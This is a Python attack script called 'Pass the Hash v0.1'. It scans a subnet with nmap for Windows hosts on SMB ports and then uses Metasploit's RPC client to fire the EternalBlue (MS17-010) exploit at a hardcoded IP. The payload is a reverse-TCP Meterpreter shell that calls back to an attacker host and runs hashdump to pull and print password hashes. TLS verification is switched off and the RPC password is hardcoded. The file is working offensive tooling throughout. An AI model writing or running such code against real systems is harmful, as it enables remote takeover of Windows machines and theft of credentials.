from __future__ import print_function

import nmap
import re
import sys
import subprocess
import socket
from metasploit.msfrpc import MsfRpcClient
import ssl
import time

def header():
    print("""
      ___                     ___     
     /  /\        ___        /__/\    
    /  /::\      /  /\       \  \:\   
   /  /:/\:\    /  /:/        \__\:\  
  /  /:/~/:/   /  /:/     ___ /  /::\ 
 /__/:/ /:/   /  /::\    /__/\  /:/\:\\
 \  \:\/:/   /__/:/\:\   \  \:\/:/__\/
  \  \::/    \__\/  \:\   \  \::/     
   \  \:\         \  \:\   \  \:\     
    \  \:\         \__\/    \  \:\    
     \__\/                   \__\/ 
     
          Pass the Hash v0.1   
    """)

def convertIpToRange(ip):
	rgx = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.')
	return rgx.match(ip).group() + '0-255'

def nmScan(ip):
    targets = []
    range = convertIpToRange(ip)
    nm = nmap.PortScanner()
    print("Starting nmap scan over range: " + range + "...")
    nm.scan(hosts=range, arguments="-O -n -p445,139")
    hosts = nm.all_hosts()
	# For each running machine IP picked up by nmap
    for host in hosts:
		# If they have OS information
    	if 'osmatch' in nm[host]:
            host_obj = {'ip': host, 'osfamily': "", 'osgen': []}
			# Look through all possible OS matches
            for os in nm[host]['osmatch']:
                for c in os['osclass']:
					# If the OS family is Windows add the machine to possible targets
                    if c['osfamily'] == "Windows":
                        if len(host_obj['osfamily']) == 0:
                            host_obj['osfamily'] = c['osfamily']
                        host_obj['osgen'].append(c['osgen'])
            if host_obj['osfamily'] == "Windows":
                targets.append(host_obj)
    return targets

def eternalBlue(ip):
    try:
        _create_unverified_https_context = ssl._create_unverified_context
    except AttributeError:
        pass
    else:
        ssl._create_default_https_context = _create_unverified_https_context
    client = MsfRpcClient('password')
    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
    exploit['RHOST'] = '10.202.208.172'
    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
    payload['LHOST'] = '10.202.208.230'
    exploit.execute(payload=payload)
    proc = exploit.execute(payload=payload)
    time.sleep(5)
    shell = client.sessions.session(proc.get('job_id'))
    shell.runsingle('run post/windows/gather/hashdump')
    while(True):
        output = shell.read()
        if( len(output) > 0):
            print(output)
        if(':::' in output):
            print(repr(output))
            break

def main():
    header()
    ip = sys.argv[1]
    eternalBlue(ip)
    # firstMachine('hacker', 'toor', '169.254.121.23')
    #print(socket.gethostbyname(socket.gethostname()))
    #target_hosts = nmScan(ip)
    #print("Found {} targets.".format(len(target_hosts)))

if __name__ == "__main__":
    # execute only if run as a script
    main()

